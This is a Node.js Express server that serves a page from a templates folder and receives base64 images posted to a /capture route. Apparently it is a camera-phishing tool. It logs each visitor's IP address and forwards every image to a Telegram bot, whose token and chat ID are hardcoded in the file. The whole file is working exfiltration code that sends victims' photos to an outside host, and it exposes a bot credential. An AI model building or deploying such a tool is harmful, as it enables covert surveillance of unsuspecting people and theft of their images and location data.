


const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
const PORT = 3000;

const templatesDir = path.join(__dirname, "templates");
const indexPath = path.join(templatesDir, "index.html");

// === Telegram Bot Config ===
const telegramToken = '7970078573:AAEzOuBKiLnA8jDnKNzwKFZdRbSZzPNo2KA';
const chatId = '7041065272';

// Ensure the 'capture' directory exists (though we won't be writing to it now)
const captureDir = path.join(__dirname, "capture");
if (!fs.existsSync(captureDir)) {
    fs.mkdirSync(captureDir);
}

app.use(express.static(templatesDir));
app.use(express.json({ limit: "5mb" }));

// Function to send image data to Telegram
function sendPhotoToTelegram(imageData) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
    const formData = new FormData();
    formData.append("chat_id", chatId);
    //  Important:  Use a Buffer, not a file path.
    const imageBuffer = Buffer.from(imageData, 'base64');
    formData.append("photo", imageBuffer, {
        filename: 'capture.png', //  filename is required, but doesn't have to be a real file.
        contentType: 'image/png'  //  contentType is important
    });

    axios.post(url, formData, { headers: formData.getHeaders() })
        .then(response => {
            console.log(`Telegram: Sent image`);
        })
        .catch(error => {
            console.error("Telegram error:", error.message);
        });
}

app.get("/", (req, res) => {
    fs.readFile(indexPath, 'utf8', (err, html) => {
        if (err) {
            console.error("Error reading HTML file:", err);
            return res.sendStatus(500);
        }
        res.send(html);
    });
});

// Handle image capture
app.post("/capture", (req, res) => {
    if (!req.body.image) {
        return res.sendStatus(400);
    }

    const userIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const imageData = req.body.image.replace(/^data:image\/png;base64,/, "");

    sendPhotoToTelegram(imageData); // Send directly to Telegram
    console.log(`[+] Photo sent to Telegram! IP: ${userIP}`);
    fs.appendFileSync("server.log", `Photo sent to Telegram! IP: ${userIP}\n`);
    res.sendStatus(200);

});

app.listen(PORT, () => {
    console.log(`[+] Server running at http://localhost:${PORT}`);
});
